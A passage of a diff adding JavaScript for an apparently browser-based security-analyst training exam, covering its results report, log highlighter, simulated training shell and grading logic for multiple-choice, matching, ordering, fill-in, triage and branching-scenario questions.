+      var d=el('div','s','<b>'+p[0]+'</b><span>'+p[1]+'</span>'); stats.appendChild(d);
+    });
+    ringWrap.appendChild(stats);
+    card.appendChild(ringWrap);
+    if (R.skipped>0) {
+      var names=[];
+      R.rows.forEach(function(r){ if(r.label==='skipped') names.push('#'+(r.pos+1)+' '+esc(r.ex.title)); });
+      card.appendChild(el('div','warnbox','<b>Excluded from scoring:</b> '+names.join(' \u00b7 ')+'. These exercises were skipped, so their points were removed from both the score and the total.'));
+    }
+    var th = el('h3',null,'Per-exercise report'); card.appendChild(th);
+    R.rows.forEach(function(r){
+      var a=r.a, ex=r.ex;
+      var d = el('details','reprow');
+      var lab = r.label;
+      var pts = (a.checked? a.earned : 0)+' / 10';
+      d.innerHTML = '<summary><span class="st '+lab+'">'+lab.toUpperCase()+'</span><span class="rtitle">#'+(r.pos+1)+' '+esc(ex.title)+'</span><span class="rpts">'+pts+' pts</span></summary>'+
+        '<div class="repbody">'+
+        (a.checked ? '<div><b>Your answer:</b> '+esc(a.sum||'(empty)')+'</div>'
+                   : (a.skipped ? '<div><b>Status:</b> skipped \u2014 not counted in score or total.</div>'
+                                : '<div><b>Status:</b> not answered \u2014 counted as zero points.</div>'))+
+        '<div style="margin-top:4px"><b>Correct answer:</b> '+esc(correctSummary(ex))+'</div>'+
+        '<div style="margin-top:6px">'+ex.explain+'</div>'+
+        '</div>';
+      card.appendChild(d);
+    });
+  }
+  var br = el('div','btnrow');
+  var ret = el('button','btn primary','Retake exam');
+  ret.type='button';
+  ret.addEventListener('click', function(){ resetAll(); showIntro(); window.scrollTo({top:0,behavior:scrollMotion()}); });
+  br.appendChild(ret);
+  card.appendChild(br);
+  st.appendChild(card);
+  paintNav(); paintScore();
+  window.scrollTo({top:0,behavior:scrollMotion()});
+  if (R.possible>0) reportScore(R.earned, R.possible);
+}
+
+/* ---------- log syntax highlighting ---------- */
+function hl(line){
+  var s = esc(line);
+  s = s.replace(/\b(?:\d{1,3}\[\.\]){3}\d{1,3}\b/g, '<span class="hl-ip">$&</span>');
+  s = s.replace(/\b\d{2}:\d{2}:\d{2}\b/g, '<span class="hl-ts">$&</span>');
+  s = s.replace(/\b(Failed|failed|denied|Denied|ERROR|error|refused|Refused|invalid|Invalid|unauthorized)\b/g, '<span class="hl-bad">$&</span>');
+  s = s.replace(/\b(Accepted|accepted|success|Success|OK|PASS)\b/g, '<span class="hl-good">$&</span>');
+  s = s.replace(/\b(sudo|GET|POST|PUT|DELETE|DELETE|powershell|cmd\.exe|ssh2|sshd|VPN|vpn)\b/g, '<span class="hl-kw">$&</span>');
+  s = s.replace(/(&quot;[^&]*?&quot;)/g, '<span class="hl-str">$1</span>');
+  return s;
+}
+
+/* ---------- type registry ---------- */
+var TYPES = {};
+function renderType(ex,a,box){ box.appendChild(TYPES[ex.type].render(ex,a)); }
+function grade(ex,a){ return TYPES[ex.type].grade(ex,a); }
+function markAnswers(ex,a,res,box){ if(TYPES[ex.type].mark) TYPES[ex.type].mark(ex,a,res,box); }
+function reMark(ex,a,box){ var res=grade(ex,a); markAnswers(ex,a,res,box); }
+function reviseUI(ex,a){ if(TYPES[ex.type].revise) TYPES[ex.type].revise(ex,a); else renderExam(); }
+function summarize(ex,a){ return TYPES[ex.type].sum ? TYPES[ex.type].sum(ex,a) : '(answered)'; }
+
+/* ---------- option list (qcm / multi / logview) ---------- */
+function optionBlock(ex, a, multi){
+  var d = el('div');
+  a.ui.picked = a.ui.picked || (multi? [] : -1);
+  var opts = a.ui.shuffled || (a.ui.shuffled = shuf(ex.options.map(function(o,i){return {t:o.t, ok:o.ok, i:i};})));
+  opts.forEach(function(o){
+    var b = el('button','opt'+(multi?' multi':''), '<span class="box" aria-hidden="true"></span><span>'+o.t+'</span><span class="markw" aria-hidden="true"></span>');
+    b.type='button'; b.dataset.oi = String(o.i);
+    var wasPicked = multi ? (a.ui.picked.indexOf(o.i)>=0) : (a.ui.picked===o.i);
+    b.setAttribute('aria-pressed', wasPicked ? 'true' : 'false');
+    b.addEventListener('click', function(){
+      if (a.checked) return;
+      if (multi) {
+        var k=a.ui.picked.indexOf(o.i);
+        if (k>=0) { a.ui.picked.splice(k,1); b.setAttribute('aria-pressed','false'); }
+        else { a.ui.picked.push(o.i); b.setAttribute('aria-pressed','true'); }
+      } else {
+        a.ui.picked = o.i;
+        Array.prototype.forEach.call(d.querySelectorAll('.opt'),function(x){ x.setAttribute('aria-pressed','false'); });
+        b.setAttribute('aria-pressed','true');
+      }
+    });
+    d.appendChild(b);
+  });
+  return d;
+}
+TYPES.qcm = {
+  render: function(ex,a){ return optionBlock(ex,a,false); },
+  grade: function(ex,a){
+    var p = a.ui.picked, ok=false;
+    if (p>=0 && ex.options[p] && ex.options[p].ok) ok=true;
+    return {earned: ok?10:0, elements:[{label: p>=0 ? 'Your choice: '+ex.options[p].t : 'No answer selected', state: ok?'ok':'bad'}]};
+  },
+  mark: function(ex,a,res,box){
+    Array.prototype.forEach.call(box.querySelectorAll('.opt'),function(b){
+      var i=+b.dataset.oi; var w=b.querySelector('.markw');
+      if (ex.options[i].ok) { b.classList.add('mark-ok'); w.textContent='\u2713 correct'; w.className='markw ok'; }
+      else if (i===a.ui.picked) { b.classList.add('mark-bad'); w.textContent='\u2715 your pick'; w.className='markw bad'; }
+    });
+  },
+  revise: function(ex,a){ renderExam(); },
+  sum: function(ex,a){ return a.ui.picked>=0 ? ex.options[a.ui.picked].t : '(no answer)'; }
+};
+TYPES.multi = {
+  render: function(ex,a){ return optionBlock(ex,a,true); },
+  grade: function(ex,a){
+    var picked = a.ui.picked||[];
+    var els=[], okCount=0, nOk=0;
+    ex.options.forEach(function(o){
+      if (o.ok) nOk++;
+    });
+    ex.options.forEach(function(o,i){
+      var sel = picked.indexOf(i)>=0;
+      if (o.ok && sel) { okCount++; els.push({label:o.t, state:'ok'}); }
+      else if (o.ok && !sel) els.push({label:o.t, state:'miss'});
+      else if (!o.ok && sel) els.push({label:o.t, state:'bad'});
+    });
+    var per = 10/nOk;
+    return {earned: per*okCount, elements: els};
+  },
+  mark: function(ex,a,res,box){
+    var picked=a.ui.picked||[];
+    Array.prototype.forEach.call(box.querySelectorAll('.opt'),function(b){
+      var i=+b.dataset.oi; var o=ex.options[i]; var w=b.querySelector('.markw');
+      if (o.ok && picked.indexOf(i)>=0) { b.classList.add('mark-ok'); w.textContent='\u2713 correct'; w.className='markw ok'; }
+      else if (o.ok) { b.classList.add('mark-miss'); w.textContent='\u26a0 missed'; w.className='markw miss'; }
+      else if (picked.indexOf(i)>=0) { b.classList.add('mark-bad'); w.textContent='\u2715 wrong pick'; w.className='markw bad'; }
+    });
+  },
+  revise: function(ex,a){ renderExam(); },
+  sum: function(ex,a){ var p=a.ui.picked||[]; return p.length? p.map(function(i){return ex.options[i].t;}).join(' \u00b7 ') : '(no answer)'; }
+};
+TYPES.logview = {
+  render: function(ex,a){
+    var wrap = el('div');
+    var lw = el('div','logwrap');
+    var bar = el('div','logbar');
+    var inp = el('input'); inp.type='text'; inp.placeholder='Filter lines (text match, case-insensitive)'; inp.setAttribute('aria-label','Filter log lines');
+    var cnt = el('span','cnt', ex.logs.length+' lines');
+    bar.appendChild(inp); bar.appendChild(cnt); lw.appendChild(bar);
+    var ll = el('div','loglines');
+    lw.appendChild(ll);
+    function paint(f){
+      var shown=0;
+      ll.innerHTML='';
+      ex.logs.forEach(function(t){
+        if (f && t.toLowerCase().indexOf(f)<0) return;
+        shown++;
+        ll.appendChild(el('div','logline', hl(t)));
+      });
+      cnt.textContent = shown+' / '+ex.logs.length+' lines';
+    }
+    paint('');
+    inp.addEventListener('input', function(){ paint(inp.value.trim().toLowerCase()); });
+    wrap.appendChild(lw);
+    var sp = el('div'); sp.style.height = '10px';
+    wrap.appendChild(sp);
+    var ab = el('div'); ab.style.marginTop='10px';
+    ab.appendChild(optionBlock(ex,a,false));
+    wrap.appendChild(ab);
+    return wrap;
+  },
+  grade: TYPES.qcm.grade,
+  mark: TYPES.qcm.mark,
+  revise: function(ex,a){ renderExam(); },
+  sum: TYPES.qcm.sum
+};
+
+/* ---------- match (drag & drop) ---------- */
+TYPES.match = {
+  render: function(ex,a){
+    var ui=a.ui;
+    if (!ui.placed) {
+      ui.placed = ex.slots.map(function(){ return -1; });
+      ui.bank = shuf(ex.items.map(function(_,i){return i;}));
+      ui.sel = -1;
+    }
+    var d = el('div');
+    var grid = el('div','mgrid');
+    var left = el('div','mcol'); left.innerHTML='<h4>Items to place</h4>';
+    var pool = el('div','pool'); pool.id='pool_'+a._k; left.appendChild(pool);
+    var right = el('div','mcol'); right.innerHTML='<h4>Slots</h4>';
+    var slots = el('div','slotlist'); right.appendChild(slots);
+    function paintPool(){
+      pool.innerHTML='';
+      ui.bank.forEach(function(ii){
+        var it=ex.items[ii];
+        var b=el('button','chipitem'+(ui.sel===ii?' sel':''), it.t);
+        b.type='button'; b.draggable = !a.checked;
+        b.setAttribute('aria-label','Item: '+it.t+'. Press to select, then choose a slot.');
+        b.addEventListener('click', function(){
+          if (a.checked) return;
+          if (ui.placed.indexOf(ii)>=0) { /* placed chips are not in bank */ }
+          ui.sel = (ui.sel===ii? -1 : ii);
+          paintPool(); paintSlots();
+        });
+        b.addEventListener('dragstart', function(ev){ try{ ev.dataTransfer.setData('text/plain', String(ii)); }catch(e){} });
+        pool.appendChild(b);
+      });
+      if (!ui.bank.length) pool.appendChild(el('div','emptyhint','All items placed.'));
+    }
+    function paintSlots(){
+      slots.innerHTML='';
+      ex.slots.forEach(function(s,si){
+        var sl=el('div','slot');
+        sl.dataset.si=String(si);
+        sl.innerHTML='<span class="slab">'+s.label+'</span>';
+        if (ui.placed[si]>=0) {
+          var it=ex.items[ui.placed[si]];
+          var fb=el('button','chipitem filled', it.t);
+          fb.type='button';
+          fb.title='Click to return this item to the pool';
+          fb.addEventListener('click', function(){
+            if (a.checked) return;
+            ui.bank.push(ui.placed[si]);
+            ui.placed[si]=-1; paintPool(); paintSlots();
+          });
+          sl.appendChild(fb);
+        } else {
+          sl.appendChild(el('div','emptyhint','Drop here or click an item, then click this slot'));
+        }
+        sl.addEventListener('click', function(ev){
+          if (a.checked) return;
+          if (ev.target!==sl && ev.target.className && String(ev.target.className).indexOf('emptyhint')<0) return;
+          place(si);
+        });
+        sl.addEventListener('dragover', function(ev){ ev.preventDefault(); sl.classList.add('over'); });
+        sl.addEventListener('dragleave', function(){ sl.classList.remove('over'); });
+        sl.addEventListener('drop', function(ev){
+          ev.preventDefault(); sl.classList.remove('over');
+          var ii=parseInt(ev.dataTransfer.getData('text/plain'),10);
+          if (isNaN(ii) || a.checked) return;
+          var bi=ui.bank.indexOf(ii);
+          if (bi<0) return;
+          ui.bank.splice(bi,1);
+          if (ui.placed[si]>=0) ui.bank.push(ui.placed[si]);
+          ui.placed[si]=ii; ui.sel=-1;
+          paintPool(); paintSlots();
+        });
+        slots.appendChild(sl);
+      });
+    }
+    function place(si){
+      if (ui.sel<0) return;
+      var bi=ui.bank.indexOf(ui.sel);
+      if (bi<0) return;
+      ui.bank.splice(bi,1);
+      if (ui.placed[si]>=0) ui.bank.push(ui.placed[si]);
+      ui.placed[si]=ui.sel; ui.sel=-1;
+      paintPool(); paintSlots();
+    }
+    paintPool(); paintSlots();
+    grid.appendChild(left); grid.appendChild(right);
+    d.appendChild(grid);
+    return d;
+  },
+  grade: function(ex,a){
+    var els=[], okc=0;
+    ex.slots.forEach(function(s,si){
+      var pi=a.ui.placed[si];
+      if (pi<0) els.push({label:s.label+' \u2014 empty', state:'miss'});
+      else if (ex.items[pi].s===si) { okc++; els.push({label:s.label+' \u2014 '+ex.items[pi].t, state:'ok'}); }
+      else els.push({label:s.label+' \u2014 '+ex.items[pi].t, state:'bad'});
+    });
+    return {earned: 10*okc/ex.slots.length, elements: els};
+  },
+  mark: function(ex,a,res,box){
+    var ui=a.ui;
+    var slots = box.querySelectorAll('.slot');
+    ex.slots.forEach(function(s,si){
+      var sl=slots[si]; if(!sl) return;
+      var pi=ui.placed[si];
+      sl.classList.remove('over');
+      var chip = sl.querySelector('.chipitem');
+      var good = pi>=0 && ex.items[pi].s===si;
+      var empty = pi<0;
+      var cls = good?'ok':(empty?'miss':'bad');
+      if (chip) chip.classList.add(cls);
+      var old = sl.querySelector('.slotnote'); if (old && old.remove) old.remove();
+      var note=document.createElement('span');
+      note.className='slotnote markw '+cls;
+      note.style.display='block';note.style.fontSize='12px';note.style.fontWeight='800';
+      note.textContent = good?'\u2713 correct':(empty?'\u26a0 empty \u2014 missed':'\u2715 wrong item');
+      sl.appendChild(note);
+    });
+  },
+  revise: function(ex,a){ renderExam(); },
+  sum: function(ex,a){
+    var ui=a.ui; var parts=[];
+    ex.slots.forEach(function(s,si){ if(ui.placed[si]>=0) parts.push(s.label+': '+ex.items[ui.placed[si]].t); });
+    return parts.length?parts.join(' \u00b7 '):'(nothing placed)';
+  }
+};
+
+/* ---------- order / rank ---------- */
+TYPES.order = {
+  render: function(ex,a){
+    var ui=a.ui;
+    if (!ui.seq) ui.seq = shuf(ex.ordered.map(function(_,i){return i;}));
+    var d=el('div');
+    var ol=el('ol','ordlist');
+    function paint(){
+      ol.innerHTML='';
+      ui.seq.forEach(function(ii,pos){
+        var li=el('li');
+        li.draggable=!a.checked;
+        li.dataset.pos=String(pos);
+        li.innerHTML='<span class="idx">'+(pos+1)+'</span><span class="otext">'+esc(ex.ordered[ii])+'</span>';
+        var mv=el('span','mv');
+        var up=el('button',null,'\u25b2'); up.type='button'; up.title='Move up'; up.setAttribute('aria-label','Move item '+ex.ordered[ii]+' up');
+        var dn=el('button',null,'\u25bc'); dn.type='button'; dn.title='Move down'; dn.setAttribute('aria-label','Move item '+ex.ordered[ii]+' down');
+        up.addEventListener('click', function(){ if(a.checked)return; if(pos>0){ var t=ui.seq[pos-1]; ui.seq[pos-1]=ui.seq[pos]; ui.seq[pos]=t; paint(); } });
+        dn.addEventListener('click', function(){ if(a.checked)return; if(pos<ui.seq.length-1){ var t=ui.seq[pos+1]; ui.seq[pos+1]=ui.seq[pos]; ui.seq[pos]=t; paint(); } });
+        mv.appendChild(up); mv.appendChild(dn);
+        li.appendChild(mv);
+        li.addEventListener('dragstart', function(ev){ try{ev.dataTransfer.setData('text/plain',String(pos));}catch(e){} li.classList.add('dragging'); });
+        li.addEventListener('dragend', function(){ li.classList.remove('dragging'); });
+        li.addEventListener('dragover', function(ev){ ev.preventDefault(); li.classList.add('over'); });
+        li.addEventListener('dragleave', function(){ li.classList.remove('over'); });
+        li.addEventListener('drop', function(ev){
+          ev.preventDefault(); li.classList.remove('over');
+          var from=parseInt(ev.dataTransfer.getData('text/plain'),10);
+          if (isNaN(from)||a.checked) return;
+          var item=ui.seq.splice(from,1)[0];
+          ui.seq.splice(pos,0,item);
+          paint();
+        });
+        ol.appendChild(li);
+      });
+    }
+    paint();
+    d.appendChild(ol);
+    return d;
+  },
+  grade: function(ex,a){
+    var els=[], okc=0;
+    a.ui.seq.forEach(function(ii,pos){
+      if (ii===pos) { okc++; els.push({label:'Position '+(pos+1)+': '+ex.ordered[ii], state:'ok'}); }
+      else els.push({label:'Position '+(pos+1)+' \u2014 you placed \u201c'+ex.ordered[ii]+'\u201d, expected \u201c'+ex.ordered[pos]+'\u201d', state:'bad'});
+    });
+    return {earned: 10*okc/ex.ordered.length, elements: els};
+  },
+  mark: function(ex,a,res,box){
+    var lis=box.querySelectorAll('.ordlist li');
+    a.ui.seq.forEach(function(ii,pos){
+      var li=lis[pos]; if(!li) return;
+      li.classList.add(ii===pos?'ok':'bad');
+    });
+  },
+  revise: function(ex,a){ renderExam(); },
+  sum: function(ex,a){ return a.ui.seq.map(function(ii){return ex.ordered[ii];}).join(' \u2192 '); }
+};
+
+/* ---------- fill ---------- */
+TYPES.fill = {
+  render: function(ex,a){
+    var ui=a.ui;
+    if (!ui.bank) ui.bank = shuf(ex.bank);
+    var d=el('div','filltext');
+    var parts = ex.text.split(/\{\{(\d+)\}\}/);
+    var html='';
+    parts.forEach(function(p,i){
+      if (i%2===1) {
+        html += '<select data-b="'+p+'" aria-label="Blank '+(parseInt(p,10)+1)+'"><option value="">\u2014 choose \u2014</option>';
+        ui.bank.forEach(function(w){ html += '<option value="'+esc(w)+'">'+esc(w)+'</option>'; });
+        html += '</select>';
+      } else html += esc(p);
+    });
+    d.innerHTML = html;
+    if (a.ui.vals) {
+      Array.prototype.forEach.call(d.querySelectorAll('select'),function(s){
+        if (a.ui.vals[s.dataset.b]) s.value=a.ui.vals[s.dataset.b];
+      });
+    }
+    d.addEventListener('change', function(ev){
+      var s=ev.target; if(s.tagName!=='SELECT') return;
+      a.ui.vals = a.ui.vals||{};
+      a.ui.vals[s.dataset.b]=s.value;
+    });
+    return d;
+  },
+  grade: function(ex,a){
+    var els=[], okc=0;
+    ex.blanks.forEach(function(b,n){
+      var v=(a.ui.vals&&a.ui.vals[String(n)])||'';
+      if (!v) els.push({label:'Blank '+(n+1)+' \u2014 empty (expected: '+b.a+')', state:'miss'});
+      else if (v===b.a) { okc++; els.push({label:'Blank '+(n+1)+': '+v, state:'ok'}); }
+      else els.push({label:'Blank '+(n+1)+' \u2014 you chose \u201c'+v+'\u201d, expected \u201c'+b.a+'\u201d', state:'bad'});
+    });
+    return {earned: 10*okc/ex.blanks.length, elements: els};
+  },
+  mark: function(ex,a,res,box){
+    Array.prototype.forEach.call(box.querySelectorAll('select'),function(s){
+      var n=+s.dataset.b; var v=s.value; var b=ex.blanks[n];
+      s.classList.remove('ok','bad','miss');
+      if (!v) s.classList.add('miss');
+      else s.classList.add(v===b.a?'ok':'bad');
+    });
+  },
+  revise: function(ex,a){ renderExam(); },
+  sum: function(ex,a){ var v=a.ui.vals||{}; return ex.blanks.map(function(b,n){return v[String(n)]||'(empty)';}).join(' \u00b7 '); }
+};
+
+/* ---------- spot the mistake ---------- */
+TYPES.spot = {
+  render: function(ex,a){
+    var ui=a.ui;
+    if (!ui.flags) ui.flags={};
+    var d=el('div');
+    d.appendChild(el('div','anslabel','Click a line to flag it as a mistake. Click again to unflag. There are exactly '+ex.badCount+' mistakes.'));
+    var list=el('div','spotlist');
+    function paint(){
+      list.innerHTML='';
+      ex.lines.forEach(function(l,i){
+        var b=el('button','spotline'+(ui.flags[i]?' flag':''), (l.bad?'':'')+'<span class="mono">'+esc(l.t)+'</span>'+(ui.flags[i]?'<span class="fmark">FLAGGED</span>':''));
+        b.type='button';
+        b.setAttribute('aria-pressed', ui.flags[i]?'true':'false');
+        b.setAttribute('aria-label','Line '+(i+1)+': '+l.t+'. Press to toggle mistake flag.');
+        b.addEventListener('click', function(){
+          if (a.checked) return;
+          if (ui.flags[i]) delete ui.flags[i]; else ui.flags[i]=true;
+          paint();
+        });
+        list.appendChild(b);
+      });
+    }
+    paint();
+    d.appendChild(list);
+    return d;
+  },
+  grade: function(ex,a){
+    var els=[], okc=0;
+    ex.lines.forEach(function(l,i){
+      var f=!!a.ui.flags[i];
+      if (l.bad && f) { okc++; els.push({label:'Line '+(i+1)+' \u2014 correctly flagged', state:'ok'}); }
+      else if (l.bad && !f) els.push({label:'Line '+(i+1)+' \u2014 mistake missed: '+l.t, state:'miss'});
+      else if (!l.bad && f) els.push({label:'Line '+(i+1)+' \u2014 flagged but correct: '+l.t, state:'bad'});
+    });
+    return {earned: 10*okc/ex.badCount, elements: els};
+  },
+  mark: function(ex,a,res,box){
+    var lis=box.querySelectorAll('.spotline');
+    ex.lines.forEach(function(l,i){
+      var b=lis[i]; if(!b) return;
+      b.classList.remove('ok','bad','miss');
+      var f=!!a.ui.flags[i];
+      if (l.bad && f) b.classList.add('ok');
+      else if (l.bad) b.classList.add('miss');
+      else if (f) b.classList.add('bad');
+    });
+  },
+  revise: function(ex,a){ renderExam(); },
+  sum: function(ex,a){ var f=Object.keys(a.ui.flags||{}); return f.length? ('flagged line(s) '+(f.map(function(x){return +x+1;}).join(', '))) : '(nothing flagged)'; }
+};
+
+/* ---------- triage table ---------- */
+TYPES.triage = {
+  render: function(ex,a){
+    var ui=a.ui;
+    if (!ui.vals) ui.vals = ex.rows.map(function(){ return ''; });
+    var d=el('div');
+    var w=el('div','tblwrap');
+    var t=el('table','tri');
+    var h='<thead><tr><th style="min-width:220px">Alert</th><th style="min-width:150px">Source / time</th><th>Classification or action</th></tr></thead><tbody>';
+    ex.rows.forEach(function(r,i){
+      h += '<tr><td>'+r.t+'</td><td style="color:var(--dim);font-size:13px">'+r.meta+'</td><td><select data-i="'+i+'" aria-label="Decision for alert '+(i+1)+'"><option value="">\u2014 choose \u2014</option>';
+      ex.opts.forEach(function(o,oi){ h+='<option value="'+oi+'">'+esc(o)+'</option>'; });
+      h += '</select><span class="rowmark" aria-hidden="true"></span></td></tr>';
+    });
+    t.innerHTML=h+'</tbody>';
+    w.appendChild(t); d.appendChild(w);
+    t.addEventListener('change', function(ev){
+      if (ev.target.tagName!=='SELECT') return;
+      ui.vals[+ev.target.dataset.i]=ev.target.value;
+    });
+    if (a.checked) {
+      var sels=t.querySelectorAll('select');
+      ex.rows.forEach(function(r,i){ if(ui.vals[i]!=='') sels[i].value=ui.vals[i]; });
+    }
+    return d;
+  },
+  grade: function(ex,a){
+    var els=[], okc=0;
+    ex.rows.forEach(function(r,i){
+      var v=a.ui.vals[i];
+      if (v==='') els.push({label:'Alert '+(i+1)+' \u2014 empty (expected: '+ex.opts[r.a]+')', state:'miss'});
+      else if (+v===r.a) { okc++; els.push({label:'Alert '+(i+1)+': '+ex.opts[r.a], state:'ok'}); }
+      else els.push({label:'Alert '+(i+1)+' \u2014 you chose \u201c'+ex.opts[+v]+'\u201d, expected \u201c'+ex.opts[r.a]+'\u201d', state:'bad'});
+    });
+    return {earned: 10*okc/ex.rows.length, elements: els};
+  },
+  mark: function(ex,a,res,box){
+    var sels=box.querySelectorAll('select');
+    var marks=box.querySelectorAll('.rowmark');
+    ex.rows.forEach(function(r,i){
+      var v=a.ui.vals[i];
+      var s=sels[i], m=marks[i];
+      if(!s) return;
+      s.classList.remove('ok','bad','miss');
+      if (v==='') { s.classList.add('miss'); if(m){m.textContent='\u26a0 empty';m.className='rowmark miss';} }
+      else if (+v===r.a) { s.classList.add('ok'); if(m){m.textContent='\u2713';m.className='rowmark ok';} }
+      else { s.classList.add('bad'); if(m){m.textContent='\u2715';m.className='rowmark bad';} }
+    });
+  },
+  revise: function(ex,a){ renderExam(); },
+  sum: function(ex,a){ return ex.rows.map(function(r,i){ return a.ui.vals[i]===''?'(empty)':ex.opts[+a.ui.vals[i]]; }).join(' \u00b7 '); }
+};
+
+/* ---------- terminal ---------- */
+TYPES.terminal = {
+  render: function(ex,a){
+    var ui=a.ui;
+    if (!ui.out) { ui.out = (ex.pre||[]).slice(); ui.ran=-1; ui.hist=[]; }
+    var d=el('div');
+    var t=el('div','term');
+    var th=el('div','termhead','<i></i><i></i><i></i><span style="color:var(--dim);font-size:12px;margin-left:6px">'+esc(ex.host||'analyst@ir-lab')+': ~ (training shell \u2014 not a real system)</span>');
+    t.appendChild(th);
+    var out=el('div','termout');
+    out.id='termout';
+    t.appendChild(out);
+    var row=el('div','termin');
+    var ps=el('span','ps','$');
+    var inp=el('input'); inp.type='text'; inp.autocomplete='off'; inp.spellcheck=false;
+    inp.setAttribute('aria-label','Type a command and press Enter');
+    row.appendChild(ps); row.appendChild(inp);
+    t.appendChild(row);
+    function paint(){ out.innerHTML = ui.out.map(function(l){ return '<div class="logline">'+hl(l)+'</div>'; }).join(''); out.scrollTop=out.scrollHeight; }
+    /* probe: expand combined short flags ("-ano" -> "-a -n -o") so accept patterns can
+       check for the presence of each flag regardless of the order the student typed */
+    function expandFlags(s){
+      var flat = (' '+s.replace(/[\t ]+/g,' ').trim()+' ');
+      return flat.replace(/(^|\s)-([a-z]{2,})(?=\s|$)/g, function(m,sp,fl){
+        return sp + fl.split('').map(function(c){ return '-'+c; }).join(' ');
+      });
+    }
+    function exec(cmd){
+      var line='$ '+cmd;
+      ui.out.push(line);
+      if (cmd.trim()) {
+        ui.hist.push(cmd);
+        var raw=cmd.trim(), probe=expandFlags(raw);
+        var matched=-1;
+        (ex.accept||[]).forEach(function(r,ri){ if(matched<0){ try{ var re=new RegExp(r,'i'); if(re.test(raw) || re.test(probe)) matched=ri; }catch(e){} } });
+        if (matched>=0) {
+          ui.ran=matched; ui.ranCmd=cmd.trim();
+          (ex.simOut&&ex.simOut[matched]||[ '(command executed \u2014 output recorded)' ]).forEach(function(l){ ui.out.push(l); });
+        } else {
+          var c0=cmd.trim().split(/\s+/)[0];
+          if (c0==='help') { ui.out.push('Training shell: type the command the exercise asks for and press Enter.'); }
+          else if (c0==='ls') { ui.out.push('logs/  evidence/  notes.txt'); }
+          else if (c0==='pwd') { ui.out.push('/home/analyst'); }
+          else if (c0==='whoami') { ui.out.push('analyst'); }
+          else ui.out.push('sh: '+c0+': command not found \u2014 check the exercise instructions.');
+        }
+      }
+      paint();
+    }
+    inp.addEventListener('keydown', function(ev){
+      if (ev.key==='Enter') { exec(inp.value); inp.value=''; }
+    });
+    paint();
+    d.appendChild(t);
+    d.appendChild(el('div','anslabel','Run the command, then press <b>Check</b> to grade it. You can run several commands; the accepted one counts.'));
+    return d;
+  },
+  grade: function(ex,a){
+    var ok = a.ui.ran>=0;
+    return {earned: ok?10:0, elements:[{label: ok ? 'Executed: '+a.ui.ranCmd : 'No accepted command was executed yet.', state: ok?'ok':'bad'}]};
+  },
+  mark: function(ex,a,res,box){},
+  revise: function(ex,a){},
+  sum: function(ex,a){ return a.ui.ranCmd || '(no command executed)'; }
+};
+
+/* ---------- branching scenario ---------- */
+TYPES.branch = {
+  render: function(ex,a){
+    var ui=a.ui;
+    if (!ui.picks) ui.picks = [];
+    var d=el('div','branchwrap');
+    function paint(){
+      d.innerHTML='';
+      ex.steps.forEach(function(s,si){
+        if (si>ui.picks.length) return;
+        var st=el('div','bstep');
+        st.innerHTML='<h5>DECISION '+(si+1)+' OF '+ex.steps.length+'</h5><div>'+s.situation+'</div>';
+        s.choices.forEach(function(c,ci){
+          var b=el('button','opt','<span class="box" aria-hidden="true"></span><span>'+c.t+'</span><span class="markw" aria-hidden="true"></span>');
+          b.type='button';
+          var picked = ui.picks[si]===ci;
+          b.setAttribute('aria-pressed', picked?'true':'false');
+          if (a.checked && ui.picks[si]!==undefined) {
+            if (c.ok) { b.classList.add('ok'); b.querySelector('.markw').textContent='\u2713 correct'; }
+            else if (picked) { b.classList.add('bad'); b.querySelector('.markw').textContent='\u2715 your pick'; }
+          }
+          b.addEventListener('click', function(){
+            if (a.checked || ui.picks[si]!==undefined) return;
+            ui.picks[si]=ci;
+            paint();
+          });
+          st.appendChild(b);
+        });
+        if (ui.picks[si]!==undefined) {
+          var c=s.choices[ui.picks[si]];
+          /* outcomes stay neutral until Check — the reveal moment belongs to Check, per spec */
+          if (a.checked) st.appendChild(el('div','boutcome '+(c.ok?'ok':'bad'), (c.ok?'\u2713 ':'\u2715 ')+c.outcome));
+          else st.appendChild(el('div','boutcome neutral', c.outcome));
+        }
+        d.appendChild(st);
+      });
+    }
+    paint();
+    return d;
+  },
+  grade: function(ex,a){
+    var els=[], okc=0;
+    ex.steps.forEach(function(s,si){
+      var p=a.ui.picks[si];
+      if (p===undefined) els.push({label:'Decision '+(si+1)+' \u2014 not made', state:'miss'});
+      else if (s.choices[p].ok) { okc++; els.push({label:'Decision '+(si+1)+': '+s.choices[p].t, state:'ok'}); }
+      else els.push({label:'Decision '+(si+1)+' \u2014 '+s.choices[p].t, state:'bad'});
+    });
+    return {earned: 10*okc/ex.steps.length, elements: els};
+  },
+  mark: function(ex,a,res,box){
+    var old = box.querySelector('.branchwrap');
+    if (old && old.remove) old.remove();
+    box.appendChild(TYPES.branch.render(ex,a));
+  },
+  revise: function(ex,a){ a.ui.picks=[]; renderExam(); },
+  sum: function(ex,a){ return ex.steps.map(function(s,si){ var p=a.ui.picks[si]; return p===undefined?'(no decision)':s.choices[p].t; }).join(' \u00b7 '); }
+};
+
+/* ---------- boot ---------- */
+resetAll();
+renderApp();
+showIntro();
+})();
+
+</script>
+
+</body>
+</html>
